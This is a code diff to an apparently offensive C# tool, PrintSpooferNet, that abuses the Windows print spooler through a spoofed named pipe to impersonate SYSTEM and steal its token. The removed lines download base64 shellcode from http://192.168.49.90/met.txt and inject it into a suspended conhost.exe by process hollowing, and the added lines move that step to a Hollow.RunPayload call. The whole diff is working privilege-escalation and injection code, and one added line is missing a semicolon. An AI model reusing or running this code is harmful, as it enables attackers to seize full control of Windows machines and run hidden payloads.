@@ -11,7 +11,6 @@ namespace PrintSpooferNet
     class PrintSpoofer
     {
 
-        string payload = "http://192.168.49.90/met.txt";
         Thread spoolPipeThread;
         string hostName;
         string pipeName;
@@ -30,132 +29,37 @@ namespace PrintSpooferNet
         }
 
 
-        [StructLayout(LayoutKind.Sequential)]
-        internal struct PROCESS_BASIC_INFORMATION
+        // Incomplete enum, but the pinvoke stuff has values that c# complains about and I don't need
+        [Flags]
+        public enum PipeOpenModeFlags : uint
         {
-            public IntPtr Reserved1;
-            public IntPtr PebAddress;
-            public IntPtr Reserved2;
-            public IntPtr Reserved3;
-            public IntPtr UniquePid;
-            public IntPtr MoreReserved;
-        }
-
-        [StructLayout(LayoutKind.Sequential)]
-        public struct PROCESS_INFORMATION
-        {
-            public IntPtr hProcess;
-            public IntPtr hThread;
-            public int dwProcessId;
-            public int dwThreadId;
-        }
-        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
-        public struct STARTUPINFO
-        {
-            public Int32 cb;
-            public string lpReserved;
-            public string lpDesktop;
-            public string lpTitle;
-            public Int32 dwX;
-            public Int32 dwY;
-            public Int32 dwXSize;
-            public Int32 dwYSize;
-            public Int32 dwXCountChars;
-            public Int32 dwYCountChars;
-            public Int32 dwFillAttribute;
-            public Int32 dwFlags;
-            public Int16 wShowWindow;
-            public Int16 cbReserved2;
-            public IntPtr lpReserved2;
-            public IntPtr hStdInput;
-            public IntPtr hStdOutput;
-            public IntPtr hStdError;
+            PIPE_ACCESS_DUPLEX = 0x00000003,
+            PIPE_ACCESS_INBOUND = 0x00000001,
+            PIPE_ACCESS_OUTBOUND = 0x00000002,
         }
 
         [Flags]
-        public enum AllocationType
+        public enum PipeModeFlags : uint
         {
-            Commit = 0x1000,
-            Reserve = 0x2000,
-            Decommit = 0x4000,
-            Release = 0x8000,
-            Reset = 0x80000,
-            Physical = 0x400000,
-            TopDown = 0x100000,
-            WriteWatch = 0x200000,
-            LargePages = 0x20000000
+            //One of the following type modes can be specified. The same type mode must be specified for each instance of the pipe.
+            PIPE_TYPE_BYTE = 0x00000000,
+            PIPE_TYPE_MESSAGE = 0x00000004,
+            //One of the following read modes can be specified. Different instances of the same pipe can specify different read modes
+            PIPE_READMODE_BYTE = 0x00000000,
+            PIPE_READMODE_MESSAGE = 0x00000002,
+            //One of the following wait modes can be specified. Different instances of the same pipe can specify different wait modes.
+            PIPE_WAIT = 0x00000000,
+            PIPE_NOWAIT = 0x00000001,
+            //One of the following remote-client modes can be specified. Different instances of the same pipe can specify different remote-client modes.
+            PIPE_ACCEPT_REMOTE_CLIENTS = 0x00000000,
+            PIPE_REJECT_REMOTE_CLIENTS = 0x00000008
         }
-
-        [Flags]
-        public enum MemoryProtection
-        {
-            PAGE_NOACCESS = 0x01,
-            PAGE_READONLY = 0x02,
-            PAGE_READWRITE = 0x04,
-            PAGE_WRITECOPY = 0x08,
-            PAGE_EXECUTE = 0x10,
-            PAGE_EXECUTE_READ = 0x20,
-            PAGE_EXECUTE_READWRITE = 0x40,
-            PAGE_EXECUTE_WRITECOPY = 0x80,
-            PAGE_GUARD = 0x100,
-            PAGE_NOCACHE = 0x200,
-            PAGE_WRITECOMBINE = 0x400
-        }
-        public enum CreationFlags
-        {
-            DefaultErrorMode = 0x04000000,
-            NewConsole = 0x00000010,
-            NewProcessGroup = 0x00000200,
-            SeparateWOWVDM = 0x00000800,
-            Suspended = 0x00000004,
-            UnicodeEnvironment = 0x00000400,
-            ExtendedStartupInfoPresent = 0x00080000
-        }
-        public enum LogonFlags
-        {
-            WithProfile = 1,
-            NetCredentialsOnly
-        }
-
-
-        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-        [DllImport("kernel32.dll")]
-        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
-        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-        [DllImport("kernel32.dll")]
-        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
-        [DllImport("kernel32.dll")]
-        static extern UInt32 WaitForSingleObjectEx(IntPtr hHandle, UInt32 dwMilliseconds, bool bAlertable);
-
-        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
-        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
-
-        [DllImport("kernel32.dll")]
-        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-
-        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
-        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
 
         [DllImport("kernel32.dll", SetLastError = true)]
-        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern uint ResumeThread(IntPtr hThread);
-
-        [DllImport("kernel32.dll")]
-        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
-
-        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
-        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
-
-
-        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
-        public static extern bool CreateProcessWithTokenW(IntPtr hToken, LogonFlags dwLogonFlags, string lpApplicationName, string lpCommandLine, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+        static extern IntPtr CreateNamedPipe(string lpName, PipeOpenModeFlags dwOpenMode, PipeModeFlags dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);
 
         [DllImport("kernel32.dll", SetLastError = true)]
-        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);
+        static extern bool DisconnectNamedPipe(IntPtr hNamedPipe);
 
         [DllImport("kernel32.dll")]
         static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);
@@ -178,13 +82,7 @@ namespace PrintSpooferNet
 
         [DllImport("advapi32.dll", SetLastError = true)]
         static extern bool RevertToSelf();
-        [DllImport("kernel32.dll")]
-        static extern uint GetSystemDirectory([Out] StringBuilder lpBuffer, uint uSize);
-        [DllImport("userenv.dll", SetLastError = true)]
-        static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit);
 
-        [DllImport("kernel32.dll")]
-        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, MemoryProtection flNewProtect, out MemoryProtection lpflOldProtect);
 
         void SpoolPipeThread()
         {
@@ -192,11 +90,19 @@ namespace PrintSpooferNet
 
             string pName = $"\\\\.\\pipe\\{pipeName}\\pipe\\spoolss";
 
-            IntPtr hPipe = CreateNamedPipe(pName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);
+            IntPtr hPipe = CreateNamedPipe(pName, PipeOpenModeFlags.PIPE_ACCESS_DUPLEX, PipeModeFlags.PIPE_TYPE_BYTE, 10, 0x1000, 0x1000, 0, IntPtr.Zero);
 
             Console.WriteLine(@"[+] Named pipe {0} creation returned: {1}", pipeName, hPipe);
 
-            ConnectNamedPipe(hPipe, IntPtr.Zero);
+            Console.WriteLine("[+] Connecting to named pipe");
+            if (true == ConnectNamedPipe(hPipe, IntPtr.Zero)) {
+                Console.WriteLine("[+] Victim connected to named pipe");
+            }
+            else
+            {
+                Console.WriteLine("FAILED");
+                Environment.Exit(0);
+            }
             ImpersonateNamedPipeClient(hPipe);
             OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);
             int TokenInfLength = 0;
@@ -208,15 +114,12 @@ namespace PrintSpooferNet
             Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
             string sidstr = Marshal.PtrToStringAuto(pstr);
             Console.WriteLine(@"[+] Found sid {0}", sidstr);
+            
 
-
+            // Duplicate the token
             IntPtr hSystemToken = IntPtr.Zero;
             DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);
 
-            StringBuilder sbSystemDir = new StringBuilder(256);
-            uint res1 = GetSystemDirectory(sbSystemDir, 256);
-            IntPtr env = IntPtr.Zero;
-            CreateEnvironmentBlock(out env, hSystemToken, false);
 
             String name = WindowsIdentity.GetCurrent().Name;
             Console.WriteLine("[+] Impersonated user is: " + name);
@@ -225,62 +128,13 @@ namespace PrintSpooferNet
             RevertToSelf();
 
 
-            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
-            STARTUPINFO si = new STARTUPINFO();
-            si.cb = Marshal.SizeOf(si);
-            si.lpDesktop = "WinSta0\\Default";
+            Console.WriteLine("[+] Jumping to process hollowing code")
+            // Go run our payload with the stolen token
+            Hollow.RunPayload(hSystemToken);
 
-
-            WebClient client = new WebClient();
-            Console.Write("[+] Downloading shellcode...");
-            string b64 = client.DownloadString(payload);
-            Console.WriteLine("OK");
-            byte[] buf = Convert.FromBase64String(b64);
-            int size = buf.Length;
-
-
-            Console.Write("[+] Creating process...");
-            bool res = CreateProcessWithTokenW(hSystemToken, LogonFlags.WithProfile, null, "C:\\Windows\\System32\\conhost.exe", CreationFlags.UnicodeEnvironment | CreationFlags.Suspended, env, sbSystemDir.ToString(), ref si, out pi);
-
-
-            if (false == res)
-            {
-                Console.WriteLine("CreateProcess() threw errorcode: " + Marshal.GetLastWin32Error());
-                return;
-            }
-            Console.WriteLine("OK");
-
-            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
-            uint tmp = 0;
-            IntPtr hProcess = pi.hProcess;
-            int pid = pi.dwProcessId;
-
-            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
-            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
-            byte[] addrBuf = new byte[IntPtr.Size];
-            IntPtr nRead = IntPtr.Zero;
-
-            // Read in the base address
-            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
-            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
-
-
-            // Read PE header
-            byte[] data = new byte[0x200];
-            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
-            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
-            uint opthdr = e_lfanew_offset + 0x28;
-            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
-
-            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
-
-
-            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
-            Console.WriteLine("[+] Beacon away! PID: " + pid);
-            ResumeThread(pi.hThread);
-
+            // We're done, drop the pipe
+            DisconnectNamedPipe(hPipe);            
         }
-
 
         public PrintSpoofer()
         {
@@ -292,14 +146,11 @@ namespace PrintSpooferNet
 
         public void TriggerPrintSpoofer()
         {
-
             string arg2 = $"{hostName}/pipe/{pipeName}";
             Console.WriteLine($"Calling DoStuff with args '\\\\{hostName}' '\\\\{arg2}'");
             byte[] commandBytes = Encoding.Unicode.GetBytes($"\\\\{hostName} \\\\{arg2}");
 
             RDILoader.CallExportedFunction(Data.RprnDll, "DoStuff", commandBytes);
-
-
         }
     }
 }
